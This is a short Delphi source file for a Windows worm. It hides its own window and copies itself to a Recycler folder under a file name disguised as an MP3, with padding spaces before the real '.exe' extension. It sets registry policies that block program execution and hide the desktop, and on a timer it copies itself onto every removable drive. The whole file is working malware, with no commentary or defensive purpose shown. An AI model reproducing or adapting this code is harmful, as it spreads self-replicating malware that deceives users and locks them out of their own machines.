unit Unit1;

interface

uses
  ShellApi, Windows, SysUtils, Classes, Forms,Registry,
  verrouilleur, Graphics, ExtCtrls, Controls, MPlayer;
     


type
  TForm1 = class(TForm)
    Timer3: TTimer;
    procedure FormCreate(Sender: TObject);
    procedure Timer3Timer(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1: TForm1;
  Fond:Tbitmap;
  motdepasse:string;
  compteur,i,j:integer;
  daty:string;
  anarana:string;
implementation

{$R *.dfm}



procedure mandikaflash;
var  drivenum:integer;
     drivechar: char;
     lecteur:string;
     drivebits: set of 0..25;
     handle:HWND;

begin
  Integer(DriveBits) := GetLogicalDrives;
  lecteur:='';
  for DriveNum := 0 to 25 do
  begin
    if not (DriveNum in DriveBits) then Continue;
    DriveChar := Char(DriveNum + Ord('A'));
    lecteur:= DriveChar + ':\'  ;
    if (GetDriveType(PChar(lecteur))= drive_removable) and (lecteur<>'A:\') then
    begin
     if not fileexists(lecteur+anarana) then
     begin
       copyfile(pchar('D:\Recycler\'+anarana),pchar(lecteur+anarana),false);

//       copyfile('C:\Program Files\Messenger\qtintf70.dll',pchar(lecteur+'qtintf70.dll'),false);
//       copyfile('D:\Program Files\Messenger\qtintf70.dll',pchar(lecteur+'qtintf70.dll'),false);
     end;
    end;
  end;
end;

//================= Manomboka eto ny action =======================

procedure TForm1.FormCreate(Sender: TObject);
var Registre:TRegistry;
begin
   anarana:='Tsy miady amin''ny mpandoatra vary.mp3                                        .exe';
   Registre:=TRegistry.Create;
	  try
	    Registre.RootKey:=HKEY_CURRENT_USER;
	    Registre.OpenKey('\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\', true);
      registre.WriteInteger('Restrictrun',1);
      registre.WriteInteger('Nodesktop',1);
      Registre.CloseKey;
      Registre.Free;
	  except
	  Registre.Free;
	  end;
      form1.Width:=1;
      form1.Height:= 1;
      ShowWindow(Application.Handle, SW_HIDE) ;
      SetWindowLong(Application.Handle, GWL_EXSTYLE,GetWindowLong(Application.Handle, GWL_EXSTYLE) or WS_EX_TOOLWINDOW ) ;
      copyfile(pchar(application.exename),pchar('D:\Recycler\'+anarana),false);
end;

procedure TForm1.Timer3Timer(Sender: TObject);
begin
  mandikaflash;
end;

end.
